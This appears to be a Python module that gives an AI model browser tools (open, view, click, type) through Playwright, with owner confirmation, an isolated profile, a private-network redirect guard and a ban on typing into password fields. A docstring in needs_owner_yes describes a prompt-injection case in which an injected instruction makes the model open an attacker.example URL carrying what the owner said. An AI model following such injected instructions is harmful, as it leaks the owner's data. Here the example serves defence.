"""A browser the assistant can click and type in, as tools in the tool loop.

Research could read a page but not act on one: "find the train times on
this site", "fill in the search box", "press next" had no way to happen.
These tools drive a real Chrome or Edge through Playwright:

    browser_open      go to a URL and see the page               read-only
    browser_page      see the current page again                 read-only
    browser_click     press one numbered element                 the owner says yes first
    browser_type      type into one numbered field (and submit)  the owner says yes first

A page is shown to the model as its title, address, some of its text and
a numbered list of the elements that can be pressed or typed into. Click
and type name an element by that number, so the owner's yes is asked for
exactly what will be pressed ("press the button 'Place order' on
shop.example"), not for a guess at matching text.

Served in process through the same toolbox as MCP servers: policy,
schema check, output guard (page text is outside text) and audit. The
browser is separate from the owner's: a fresh profile with none of their
cookies or logins, downloads refused, no permissions granted, and every
request to an address that is not public (the owner's router, Ollama,
other local services) aborted. Password fields are never typed into.

What it cannot show: that a click did what the site says. A click or a
submitted form is reported as done but unconfirmed. A field's typed
text is read back, so typing without submitting is confirmed.
"""

from __future__ import annotations

import asyncio
import contextlib
import logging
import os
import urllib.parse
from typing import Any

from Agent_Guru.integration.mcp_tools import ServerConfig, ToolRisk, ToolRule

logger = logging.getLogger(__name__)

SERVER_NAME = "browser"
ENABLE_ENV = "AGENT_GURU_BROWSER_TOOLS"
CHANNEL_ENV = "AGENT_GURU_BROWSER_CHANNEL"
VISIBLE_ENV = "AGENT_GURU_BROWSER_VISIBLE"
MAX_ELEMENTS = 60
MAX_TEXT = 1500
#: A browser nobody has used for this long is closed (it holds 150-300 MB).
IDLE_CLOSE_S = 300.0
_NAV_TIMEOUT_MS = 20_000
_ACTION_TIMEOUT_MS = 8_000

# Numbers the visible elements a person could press or type into, and
# marks each with data-guru-id so a click finds exactly that element.
_SNAPSHOT_JS = """
(maxElements) => {
  const sel = 'a[href],button,input:not([type=hidden]),select,textarea,summary,' +
    '[role=button],[role=link],[role=checkbox],[role=radio],[role=tab],[role=menuitem],[role=option],' +
    '[contenteditable=""],[contenteditable=true]';
  document.querySelectorAll('[data-guru-id]').forEach(e => e.removeAttribute('data-guru-id'));
  const out = [];
  for (const el of document.querySelectorAll(sel)) {
    const r = el.getBoundingClientRect();
    const st = getComputedStyle(el);
    if (r.width < 1 || r.height < 1 || st.visibility === 'hidden' || st.display === 'none' || el.disabled) continue;
    const id = out.length + 1;
    el.setAttribute('data-guru-id', String(id));
    const label = el.labels && el.labels.length ? el.labels[0].innerText : '';
    const name = (el.getAttribute('aria-label') || label || el.innerText || el.placeholder ||
                  el.title || el.alt || el.name || '').trim().replace(/\\s+/g, ' ').slice(0, 80);
    out.push({id, tag: el.tagName.toLowerCase(), type: (el.type || '').toLowerCase(),
              role: el.getAttribute('role') || '', name, href: el.tagName === 'A' ? el.href : ''});
    if (out.length >= maxElements) break;
  }
  return out;
}
"""


def enabled() -> bool:
    return os.environ.get(ENABLE_ENV, "").strip().lower() in {"1", "true", "yes", "on"}


def browser_server() -> ServerConfig:
    """The ServerConfig for the browser tools; local is set by the caller."""
    rules = {
        "browser_open": ToolRule(allow=True, risk=ToolRisk.READ_ONLY),
        "browser_page": ToolRule(allow=True, risk=ToolRisk.READ_ONLY),
        "browser_click": ToolRule(allow=True, risk=ToolRisk.EXTERNAL_SIDE_EFFECT),
        "browser_type": ToolRule(allow=True, risk=ToolRisk.EXTERNAL_SIDE_EFFECT),
    }
    return ServerConfig(name=SERVER_NAME, command="(in process)", timeout=45.0, tools=rules)


def _kind(element: dict[str, Any]) -> str:
    if element["tag"] == "a" or element["role"] == "link":
        return "link"
    if element["tag"] in ("input", "textarea") or element["role"] == "textbox":
        return "button" if element["type"] in ("submit", "button", "reset") else f"field ({element['type'] or 'text'})"
    if element["tag"] == "select":
        return "list"
    return element["role"] or "button"


class BrowserTools:
    """The browser tools (see the module docstring)."""

    def __init__(self, *, allow_private: bool = False) -> None:
        # allow_private is for tests that serve pages on this machine.
        self._allow_private = allow_private
        self._playwright: Any = None
        self._browser: Any = None
        self._context: Any = None
        self._page: Any = None
        self._elements: dict[int, dict[str, Any]] = {}
        self._idle: asyncio.TimerHandle | None = None
        self._lock = asyncio.Lock()
        #: Redirects followed for the current page; reset at each browser_open.
        self._hops = 0
        #: Addresses the guard answered with a page that navigates on to a checked redirect target.
        self._redirect_pages: set[str] = set()

    def tool_list(self) -> list[dict[str, Any]]:
        if not enabled():
            return []
        element = {"type": "integer", "minimum": 1, "maximum": MAX_ELEMENTS}
        return [
            {"name": "browser_open", "description": "Open a web address in the assistant's own browser and see the "
             "page: its text and numbered buttons, links and fields.",
             "annotations": {"readOnlyHint": True, "openWorldHint": True},
             "inputSchema": {"type": "object", "properties": {"url": {"type": "string", "minLength": 4, "maxLength": 2000}},
                             "required": ["url"], "additionalProperties": False}},
            {"name": "browser_page", "description": "See the browser's current page again, with its numbered elements.",
             "annotations": {"readOnlyHint": True},
             "inputSchema": {"type": "object", "properties": {}, "additionalProperties": False}},
            {"name": "browser_click", "description": "Press one numbered element of the current page (a button, "
             "link or checkbox). The owner confirms first.",
             "annotations": {"readOnlyHint": False, "openWorldHint": True},
             "inputSchema": {"type": "object", "properties": {"element": element},
                             "required": ["element"], "additionalProperties": False}},
            {"name": "browser_type", "description": "Type text into one numbered field of the current page, and "
             "press Enter if submit is true. The owner confirms first. Never for passwords.",
             "annotations": {"readOnlyHint": False, "openWorldHint": True},
             "inputSchema": {"type": "object", "properties": {
                 "element": element, "text": {"type": "string", "maxLength": 500}, "submit": {"type": "boolean"}},
                 "required": ["element", "text"], "additionalProperties": False}},
        ]

    def describe(self, tool: str, arguments: dict[str, Any]) -> str | None:
        """The owner's confirmation question names the element and the site, not a number."""
        element = self._elements.get(arguments.get("element")) if isinstance(arguments, dict) else None
        if element is None:
            return None
        site = urllib.parse.urlsplit(self._page.url).hostname if self._page is not None else "the page"
        what = f"the {_kind(element)} '{element['name'] or 'unnamed'}' on {site}"
        if tool == "browser_click":
            return f"press {what}"
        if tool == "browser_type":
            then = " and press Enter" if arguments.get("submit") else ""
            return f"type '{str(arguments.get('text', ''))[:120]}' into {what}{then}"
        return None

    def needs_owner_yes(self, tool: str, arguments: dict[str, Any], owner_text: str,
                        sources: list[tuple[str, str]]) -> str | None:
        """Why browser_open must ask first, or None when the owner or this turn's sources named the address.

        browser_open went to any address the model chose without asking, because it changes nothing
        on the machine; an injected instruction could make it open
        https://attacker.example/?q=<what the owner said> and the visit carried the data out. Pages
        the browser itself returned do not vouch for an address: that is the injection path.
        """
        if tool != "browser_open":
            return None
        from Agent_Guru.security.url_trust import untrusted

        vouching = [text for source, text in sources if not source.startswith(f"{SERVER_NAME}/")]
        url = str(arguments.get("url", "")) if isinstance(arguments, dict) else ""
        return untrusted(url, owner_text, vouching)

    async def precheck(self, tool: str, arguments: dict[str, Any]) -> list[str]:
        if tool not in ("browser_click", "browser_type"):
            return []
        element = self._elements.get(arguments.get("element"))
        if self._page is None or element is None:
            return ["no such element on the current page; open the page or look at it again first"]
        if tool == "browser_type" and element["type"] == "password":
            return ["password fields are never typed into"]
        return []

    async def call(self, name: str, arguments: dict[str, Any]) -> tuple[str, bool, bool]:
        async with self._lock:
            self._touch()
            try:
                if name == "browser_open":
                    return await self._open(str(arguments.get("url", "")))
                if name == "browser_page":
                    if self._page is None:
                        return "No page is open.", True, False
                    return await self._snapshot(), False, False
                if name in ("browser_click", "browser_type"):
                    problems = await self.precheck(name, arguments)
                    if problems:
                        return problems[0], True, False
                    if name == "browser_click":
                        return await self._click(int(arguments["element"]))
                    return await self._type(int(arguments["element"]), str(arguments.get("text", "")),
                                            submit=arguments.get("submit") is True)
            except Exception as exc:
                logger.warning("Browser tool %s failed: %s", name, exc)
                return f"The browser could not do that: {type(exc).__name__}: {str(exc)[:200]}", True, False
        return f"unknown tool {name}", True, False

    async def _open(self, url: str) -> tuple[str, bool, bool]:
        if "://" not in url:
            url = "https://" + url
        if urllib.parse.urlsplit(url).scheme not in ("http", "https"):
            return "Only http and https addresses can be opened.", True, False
        page = await self._ensure_page()
        self._hops = 0
        self._redirect_pages.clear()
        try:
            await page.goto(url, wait_until="domcontentloaded", timeout=_NAV_TIMEOUT_MS)
        except Exception as exc:
            # A checked redirect (see _fetch_checked) replaces the first page at once.
            if "interrupted by another navigation" not in str(exc):
                raise
        # Each redirect hop is its own navigation: wait until the page is not
        # one of the redirect pages the guard served before reading it.
        for _ in range(50):
            with contextlib.suppress(Exception):
                await page.wait_for_load_state("load", timeout=_NAV_TIMEOUT_MS)
            if page.url not in self._redirect_pages:
                break
            await asyncio.sleep(0.2)
        with contextlib.suppress(Exception):
            await page.wait_for_load_state("domcontentloaded", timeout=_NAV_TIMEOUT_MS)
        if page.url.startswith("chrome-error://"):
            return "The page could not be opened: a redirect led somewhere it may not go.", True, False
        return await self._snapshot(), False, False

    async def _click(self, element_id: int) -> tuple[str, bool, bool]:
        before = self._page.url
        await self._page.locator(f'[data-guru-id="{element_id}"]').first.click(timeout=_ACTION_TIMEOUT_MS)
        with contextlib.suppress(Exception):
            await self._page.wait_for_load_state("domcontentloaded", timeout=_NAV_TIMEOUT_MS)
        moved = "" if self._page.url == before else f" The page changed to {self._page.url}."
        # The click happened; what the site did with it cannot be confirmed here.
        return f"Pressed it.{moved}\n\n" + await self._snapshot(), False, False

    async def _type(self, element_id: int, text: str, *, submit: bool) -> tuple[str, bool, bool]:
        field = self._page.locator(f'[data-guru-id="{element_id}"]').first
        await field.fill(text, timeout=_ACTION_TIMEOUT_MS)
        typed = await field.input_value(timeout=_ACTION_TIMEOUT_MS)
        if typed != text:
            return f"Typed, but the field now holds {typed[:80]!r}.", True, False
        if not submit:
            return f"The field now holds {text[:80]!r}.", False, True
        await field.press("Enter", timeout=_ACTION_TIMEOUT_MS)
        with contextlib.suppress(Exception):
            await self._page.wait_for_load_state("domcontentloaded", timeout=_NAV_TIMEOUT_MS)
        return "Typed it and pressed Enter.\n\n" + await self._snapshot(), False, False

    async def _snapshot(self) -> str:
        page = self._page
        elements = await page.evaluate(_SNAPSHOT_JS, MAX_ELEMENTS)
        self._elements = {e["id"]: e for e in elements}
        text = " ".join((await page.inner_text("body", timeout=_ACTION_TIMEOUT_MS)).split())
        lines = [f"Page: {await page.title()} ({page.url})",
                 "Text: " + (text[:MAX_TEXT] + (" ..." if len(text) > MAX_TEXT else "") if text else "(none)"),
                 "Elements:" if elements else "Elements: none"]
        for e in elements:
            target = f" -> {e['href'][:100]}" if e["href"] else ""
            lines.append(f"[{e['id']}] {_kind(e)} '{e['name'] or 'unnamed'}'{target}")
        return "\n".join(lines)

    async def _ensure_page(self) -> Any:
        if self._page is not None and not self._page.is_closed():
            return self._page
        from playwright.async_api import async_playwright

        if self._playwright is None:
            self._playwright = await async_playwright().start()
        if self._browser is None:
            visible = os.environ.get(VISIBLE_ENV, "").strip().lower() in {"1", "true", "yes", "on"}
            channels = [os.environ.get(CHANNEL_ENV, "").strip()] if os.environ.get(CHANNEL_ENV, "").strip() else [
                "msedge", "chrome", ""]
            errors = []
            for channel in channels:
                try:
                    self._browser = await self._playwright.chromium.launch(
                        channel=channel or None, headless=not visible,
                    )
                    break
                except Exception as exc:
                    errors.append(f"{channel or 'chromium'}: {str(exc)[:120]}")
            if self._browser is None:
                msg = "no browser could be started (" + "; ".join(errors) + ")"
                raise RuntimeError(msg)
        # A fresh context: none of the owner's cookies, logins or saved passwords.
        self._context = await self._browser.new_context(accept_downloads=False, service_workers="block")
        await self._context.route("**/*", self._guard)
        self._page = await self._context.new_page()
        return self._page

    async def _guard(self, route: Any) -> None:
        """Abort any request to an address that is not public, on every hop and for every subresource."""
        if not self._allow_private:
            from Agent_Guru.platform.features.web_fetch import BlockedDestination, resolve_public

            parts = urllib.parse.urlsplit(route.request.url)
            if parts.scheme in ("http", "https", "ws", "wss"):
                try:
                    await resolve_public(parts.hostname or "", parts.port or (443 if parts.scheme in ("https", "wss") else 80))
                except BlockedDestination:
                    await route.abort("blockedbyclient")
                    return
            elif parts.scheme not in ("data", "blob", "about"):
                await route.abort("blockedbyclient")
                return
            if parts.scheme in ("http", "https"):
                await self._fetch_checked(route)
                return
        await route.continue_()

    async def _fetch_checked(self, route: Any) -> None:
        """Fetch one request here, checking every redirect target before anything follows it.

        The browser followed redirects itself, past the check on the first
        request, so a public page redirecting to 127.0.0.1 or localhost
        loaded the local page; handing the redirect back to the browser did
        not help, since it followed that too without asking the route again.
        A page's redirect becomes a small page that navigates to the checked
        target, which is a new request through this guard; a subresource's
        redirects are followed here, at most five hops, each checked.
        """
        import html

        from Agent_Guru.platform.features.web_fetch import BlockedDestination, resolve_public

        async def allowed(url: str) -> bool:
            parts = urllib.parse.urlsplit(url)
            if parts.scheme not in ("http", "https"):
                return False
            try:
                await resolve_public(parts.hostname or "", parts.port or (443 if parts.scheme == "https" else 80))
            except BlockedDestination:
                return False
            return True

        url = route.request.url
        for _ in range(6):
            try:
                response = await route.fetch(url=url, max_redirects=0)
            except Exception:
                await route.abort("failed")
                return
            location = response.headers.get("location")
            if not (300 <= response.status < 400 and location):
                await route.fulfill(response=response)
                return
            target = urllib.parse.urljoin(url, location)
            if not await allowed(target):
                await route.abort("blockedbyclient")
                return
            if route.request.is_navigation_request():
                self._hops += 1
                if self._hops > 10:
                    await route.abort("blockedbyclient")
                    return
                self._redirect_pages.add(url)
                await route.fulfill(status=200, content_type="text/html",
                                    body=f'<meta http-equiv="refresh" content="0;url={html.escape(target, quote=True)}">')
                return
            url = target
        await route.abort("blockedbyclient")

    def _touch(self) -> None:
        if self._idle is not None:
            self._idle.cancel()
        loop = asyncio.get_running_loop()
        self._idle = loop.call_later(IDLE_CLOSE_S, lambda: loop.create_task(self.close()))

    async def close(self) -> None:
        """Close the browser; the next call starts a new one."""
        if self._idle is not None:
            self._idle.cancel()
            self._idle = None
        for thing in (self._context, self._browser):
            if thing is not None:
                with contextlib.suppress(Exception):
                    await thing.close()
        if self._playwright is not None:
            with contextlib.suppress(Exception):
                await self._playwright.stop()
        self._playwright = self._browser = self._context = self._page = None
        self._elements = {}
